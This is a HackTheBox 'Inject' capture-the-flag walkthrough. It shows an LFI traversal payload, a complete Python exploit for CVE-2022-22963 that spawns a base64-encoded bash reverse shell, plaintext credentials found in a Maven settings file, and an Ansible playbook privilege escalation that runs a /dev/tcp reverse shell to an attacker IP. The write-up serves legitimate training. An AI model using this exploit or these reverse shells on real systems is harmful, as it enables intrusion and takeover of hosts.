---
title: Inject
tags:
  - HackTheBox
  - Easy
  - Linux
  - LFI
  - Springboot
  - Spring4shell
  - Ansible
date: 2025-05-30T00:00:00Z
---
![](Pasted%20image%2020250530180127.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.204 inject.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- inject.htb > sC.txt

[redacted]
PORT   STATE SERVICE
```

So I checked the port `8080`:

![](Pasted%20image%2020250530180422.png)

Inspecting the source code I found a `/upload`:

![](Pasted%20image%2020250530180520.png)

![](Pasted%20image%2020250530180535.png)

You can upload an image and then inspect it on the browser:

![](Pasted%20image%2020250530180730.png)

![](Pasted%20image%2020250530180741.png)

## Exploitation

So I'll test for possible LFI with [Ffuf 🐳](/notes/tools/Ffuf.md):

```shell
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://inject.htb:8080/show_image?img=FUZZ' -fc 500

[redacted]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 1986, Words: 17, Lines: 38, Duration: 60ms]
```

So If I capture the request with CAIDO I can confirm the vulnerability with the following payload: `..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`:

![](Pasted%20image%2020250530181525.png)

Then I can try to search for private content inside the web root server with this payload: `..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww`:

![](Pasted%20image%2020250530182325.png)

Now I can check inside `WebApp`:

![](Pasted%20image%2020250530182510.png)

Inspecting the `pom.xml` reveals that the website is using Spring 3.2.2:

![](Pasted%20image%2020250530182727.png)

![](Pasted%20image%2020250530183105.png)

## Weaponization

I searched for "spring 3.2.2 cve" and found [CVE-2022-22963](https://www.exploit-db.com/exploits/51577) -> [PoC](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit/blob/main/exploit.py)

## Exploitation x2

```python
#!/usr/bin/python3
import requests
import argparse
import socket, sys, time
from threading import Thread
import os
import base64

def nc_listener():
    os.system("nc -lnvp 4444")

def exploit(url,cmd):
    vulnURL = f'{url}/functionRouter'
    payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    body = '.'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K
HTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
        }
    response = requests.post(url = vulnURL, data = body, headers = headers, verify=Fal
se, timeout=5)
    return response

def vuln(code,text):
    resp = '"error":"Internal Server Error"'
    if code == 500 and resp in text:
        print(f'[+] {args.url} is vulnerable\n')
        return True
    else:
        print(f'[-] {args.url} is not vulnerable\n')
        return False

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="URL of the site with spring F
ramework, example: http://vulnerablesite.com:8080")
    args = parser.parse_args()
    
    if args.url is None:
        parser.print_help()
        sys.exit(1)
    
    print(f"[+] Target {args.url}\n")
    print(f"[+] Checking if {args.url} is vulnerable to CVE-2022-22963...\n")
    response = exploit(args.url,"touch /tmp/pwned")
    v = vuln(response.status_code,response.text)
    if v == True:
        chk = input("[/] Attempt to take a reverse shell? [y/n]")
        if chk == 'y' or chk == 'Y':
            listener_thread = Thread(target=nc_listener)
            listener_thread.start()
            time.sleep(2)
            attacker_ip=input("[$$] Attacker IP:  ")
            command = f"bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1"
            final_command = 'bash -c {echo,' + ((str(base64.b64encode(command.encode('
utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}'
            exploit(args.url,final_command)
    else:
        exit(0)
```

![](Pasted%20image%2020250530185638.png)

## Pivoting

I discovered a hidden directory called `.m2` inside `frank`'s home directory, which contains a file called `settings.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

> Got creds: `phil:DocPhillovestoInject123`
### User flag

I can now become `phil` by doing:

```shell
su phil
```

and get user flag:

![](Pasted%20image%2020250530191416.png)

## Privilege Escalation

I ran linpeas and find out things of Ansible running on the back:

![](Pasted%20image%2020250530191348.png)

>[!Info]
>*Ansible is a suite of software tools designed for infrastructure as code, enabling automation in software provisioning, configuration management, and application deployment.*

I found a `.yml` called `/opt/automation/tasks/playbook_1.yml`:

```yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

## Weaponization x2

I searched for "ansible exploitation" and found [ExploitNotes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/).

## Exploitation x3

This playbook is designed to check if the webapp service is running on the local machine, and if not, to start and configure it to start automatically at boot time.

If we check the permissions on the `/opt/automation/tasks/` directory, we find that only the user root and the user group staff have read and write access:

![](Pasted%20image%2020250530192259.png)

So as we are part of group `staff`, we can create a malicious Ansible playbook yml:

```yml
- hosts: localhost
  tasks:
    - name: RShell
      command: sudo bash /tmp/root.sh
```

Then I create the `root.sh`:

```shell
echo '/bin/bash -i >& /dev/tcp/10.10.14.36/666 0>&1' > /tmp/root.sh
```

Then execute ansible:

```shell
ansible
```

![](Pasted%20image%2020250530192649.png)

### Root flag

![](Pasted%20image%2020250530192744.png)

==Machine pwned!==